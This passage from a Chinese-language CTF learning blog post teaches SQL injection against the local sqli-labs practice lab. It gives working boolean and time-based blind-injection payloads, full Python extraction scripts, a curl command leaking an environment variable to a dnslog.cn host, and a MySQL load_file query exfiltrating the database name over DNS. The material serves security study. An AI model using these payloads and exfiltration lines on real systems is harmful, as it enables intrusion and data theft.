in</code>，就好比，你登陆成功了，上面不显示你的用户名，只是告诉了你登录成功，否则提示你账号或者密码错误。虽然报错有提示，但是我们不用，主要使用盲注来解决。</p><p>首先我们想知道有什么数据库，我们就象征性打一个数据库 <code>security</code> 下来吧，通过盲注的方式把这个数据库名获取到。</p><p>首先我们确定一下数据库名字多长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5--+</span><br></pre></td></tr></table></figure><p>小于5发现没有回显，我们换成 <code>&lt;8</code>，发现还是没有，再换成 <code>&lt;9</code> 发现有。我们就知道了数据库名长度为 <code>8</code> 了。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/27.png" alt="27"></p><p>接下来我们使用 <code>left</code> 函数截取字符串前缀，然后判断，我们一位一位开始判断。最后发现 <code>left(database(),1)=&#39;s&#39;</code> 返回正确结果。于是我们知道了数据库第一个字是 <code>s</code>。然后我们后面再一直这样判断，便能很快知道数据库名了。</p><p>这里为了提升自己，建议自己用 <code>python</code> 写一个脚本来进行盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure><p>我们看看运行结果。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/28.png" alt="28"></p><p>然后写一下跑数据库名称的脚本。这里需要解释一下为什么我们在截取字符的时候为什么要加 <code>ord</code>，因为 <code>mysql</code> 是不区分大小写的，所以直接字符串比较就可能出现 <code>mid(database(),1,1)&lt;&#39;T&#39;</code> 为 <code>true</code> 但是 <code>mid(database(),1,1)&lt;&#39;s&#39;</code> 为 <code>false</code>，这显然不符合二分答案的期望，会导致程序死掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and ord(mid(database(),&#123;0&#125;,1))&lt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br></pre></td></tr></table></figure><p>跑一下也可以看到结果</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/29.png" alt="29"></p><p>但是我们仍然想知道所有数据库的名称怎么办呢？那就改一下，继续跑，就是会慢一点，这里我们用一个变量统计一下看看它一共请求了多少次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png" alt="30"></p><p>可以看到注出这些数据库一共请求了 <code>758</code> 次，而且二分算是效率比较高的了，也许你会说我写的也有问题，范围应该限定在 <code>33-127</code>，但是对于二分来说，范围缩小一半也只是少请求一次而已，整个信息长度 <code>94</code>，我们理论上也就会少请求了 <code>94</code> 次。在经过实际测量之后，发现也是要请求 <code>632</code> 次的，所以盲注是不可能去手打的，一定要学会自己写脚本跑，自己会写能应对任何情况，而你如果一味的依靠 <code>sqlmap</code> 最终会发现吃亏的还是自己。</p><p>布尔盲注一般应用在页面无有关数据库内容的回显，报错也无提示，并且只有两种回显的结果的时候用的。比较万金油，但是会导致请求量很大，实际应用的时候如果限制请求次数那么会很难。</p><p>基于时间的盲注</p><p>这个可以说是最后的法宝了，因为它使用所有的带有注入的页面。如果你的查询请求甚至不会有一点点的回显，比如说登录的时候都不告诉你登录成功或者账号密码失败，这个时候我们就只能使用基于时间的盲注了。</p><p>烫芝士：所有语言的特性—逻辑运算与和或都有这么个特性，两个表达式 <code>and</code>，如果第一个表达式为 <code>0</code> 那么不会运算第二个表达式，两个表达式 <code>or</code>，如果第一个表达式为 <code>1</code> 那么不会计算第二个表达式，两个表达式可以扩展到 <code>n</code> 个表达式。</p><p>基于此，我们给出第一个 <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 表达式 and sleep(5)--+</span><br></pre></td></tr></table></figure><p>这里可以看到表达式为 <code>1</code> 那么会执行 <code>sleep</code>，如果为 <code>0</code>，那么不会执行。</p><p>我这里写了两个 <code>payload</code>，一个是 <code>1&#39; and length(database())&lt;5 and sleep(5)--+</code> 一个是 <code>1&#39; and length(database())&lt;9 and sleep(5)--+</code>，打开控制台的网络选项，我们可以看到</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/31.png" alt="31"></p><p>前者在 <code>10ms</code> 的时间内就返回了，而后者在 <code>5.02S</code> 才返回。可以看到后面的表达式为真就会休眠 <code>5S</code>，根据返回的时间差来判断表达式是否正确。</p><p>那么我们也来自己写一个脚本来跑跑时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">ss=time.time()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata) and sleep(1)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="comment">#print(time.time()-start)</span></span><br><span class="line">    <span class="comment">#quit()</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">32</span></span><br><span class="line">    r=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata) and sleep(1);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        start=time.time()</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cost:&#x27;</span>+<span class="built_in">str</span>(time.time()-ss))</span><br></pre></td></tr></table></figure><p>跟布尔盲注差不多，就是在后面加上个 <code>sleep(1)</code> 就行了，我们也不用回显的结果去判断了，直接用经过的时间是否超过 <code>1S</code> 就好了。这里我们不仅统计了请求次数，我们还统计了花费时间。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png" alt="31"></p><p>可以看到请求次数跟上面是一样的(小声：我偷偷改了ASCII的范围)。并且注出这94个字符我们花费了将近 <code>4min</code>，可以看到这个时间成本也是非常高的。</p><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>基于时间的盲注基本适用于所有含有注入漏洞的页面，但是时间成本是最高的。</p><h4 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h4><p>以上两个盲注不管是哪个都需要频繁请求数据库才能获取到数据库的具体信息，在当代 <code>WAF</code> 防护如此严密的情况下，请求如此多很可能会导致 <code>ip</code> 被 <code>ban</code>，这里我们可以使用 <code>load_file</code> 来发起一个 <code>DNS</code> 请求。</p><h5 id="前置芝士：mysql读取文件"><a href="#前置芝士：mysql读取文件" class="headerlink" title="前置芝士：mysql读取文件"></a>前置芝士：mysql读取文件</h5><p>先介绍一个函数，之前读写文件的时候用过：<code>load_file(file)</code> 可以读取文件的内容。这里不仅可以读取本地的文件，还能向 <code>url</code> 发起请求。这里需要注意一下数据库的配置，数据库中有一个变量是 <code>secure_file_priv</code>，可以直接查看数据库的配置文件，或者是在 <code>mysql</code> 终端中直接使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>来查看这一项配置。</p><ul><li>当 <code>secure_file_priv</code> 为空，就可以读取磁盘的目录。</li><li>当 <code>secure_file_priv</code> 为<code>G:\</code>，就可以读取G盘的文件。</li><li>当 <code>secure_file_priv</code> 为 <code>null</code>，<code>load_file</code> 就不能加载文件。</li></ul><p>所以为了方便，我们最好把 <code>my.ini</code> 文件的该项配置设置成：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这样我们就能任意读取，任意写文件了，但是在生产环境中慎重配置，因为比较危险。</p><p>读取文件的一般形式是 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file);</span><br></pre></td></tr></table></figure><p>比如我想读取 <code>D:</code> 目录下的 <code>1.txt</code> 文件，那就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png" alt="33"></p><p>可以发现读取结果以十六进制的方式输出出来了。</p><p>需要注意的是，文件名若以双反斜杠开头则代表向 <code>url</code> 发起请求。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png" alt="35"></p><p>但是会发现这一请求比较耗时，</p><p>写文件的一般形式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $information into outfile &quot;$file&quot;</span><br></pre></td></tr></table></figure><p>但是不能覆盖文件，只能创建文件。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png" alt="34"></p><p>在一般情况下，读文件可以读取一些配置文件信息，泄露敏感内容</p><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>域名解析服务(Domain Name Server)，我们知道 <code>DNS</code> 的作用就是将我们熟知的域名转换成 <code>ip</code> 地址。</p><p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。</p><p>比如谷歌的域名：<code>www.google.com</code><br>它由三个标号组成， <code>com</code> 即为顶级域名，<code>google</code> 为二级域名，<code>www</code> 即为三级域名,且域名不分区大小写。<br>比如我访问 <code>www.google.com</code> 发生了以下的事情：</p><ol><li>我请求我自己设置的域名服务器</li><li>域名服务器向知道此域名的服务器发起请求</li><li>域名服务器得到了 <code>www.google.com</code> 的 <code>ip</code> 地址，返回给我设置的服务器，最后返回给我。</li></ol><p>我们在域名服务器中就留下了这样一条记录：<code>x.x.x.x</code> 用户在什么时候解析了 <code>www.google.com</code> 的域名。</p><h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名 <code>www.google.com</code> 等的访问信息，类似日志文件。</p><p>假如我在 <code>www.google.com</code> 之后还加了一个子域名，我的请求内容是 <code>xxx.www.google.com</code>，那么此时外部服务器并不知道谷歌在 <code>www</code> 域名下面还有一个子域名，那么它将域名请求发送给谷歌的服务器，谷歌服务器再解析出一个 <code>ip</code> 地址回去给域名服务器，当然也可能没有返回为空，不过这个请求还是会被谷歌的服务记录下来。这样我们的 <code>dns</code> 就会在网站的 <code>dns</code> 服务器留下信息了。</p><p>那么 <code>dnslog</code> 注入就是这么个原理了。它在你请求域名的时候，如果出现了分配给你 <code>dnslog</code> 服务器的日志，就会把数据返回给你。  </p><p>我们先来试试普通的 <code>dnslog</code> 带出信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl %USERNAME%.xxx.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png" alt="36"></p><p>可以看到环境变量被执行带出到我们的 <code>dnslog</code> 服务器里面去了，<code>connection refused</code> 是因为他对所有的子域名解析的服务器地址都是 <code>127.0.0.1</code> 所以你本机没开 <code>web</code> 服务就会这样。</p><p>我们再来试试看在 <code>mysql</code> 里面泄露信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn&#x27;));</span><br></pre></td></tr></table></figure><p>我们来试试去请求一下看看。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png" alt="37"></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png" alt="38"></p><p>可以发现成功泄露信息。</p><p>但是也要注意一下，每级域名长度最长为63，因此每次我们在请求的时候限制一下，用 <code>mid</code> 去截取就好了，虽然发起一次 <code>DNSlog</code> 请求要的时间也很多，但是比盲注要好一点。</p><p>域名若带有特殊字符会导致请求失败，因此在若泄露的信息有特殊符号注意编码一下，用 <code>hex</code> 去编码就好了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>sql</code> 注入也就学了这么多，暂时先写到这里吧，后续学了新的芝士再来补充。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql学了也有一段时间了，想着把能用到的知识点都写一遍好。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="sql注入" scheme="http://example.com/categories/ctf/web/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
</feed>
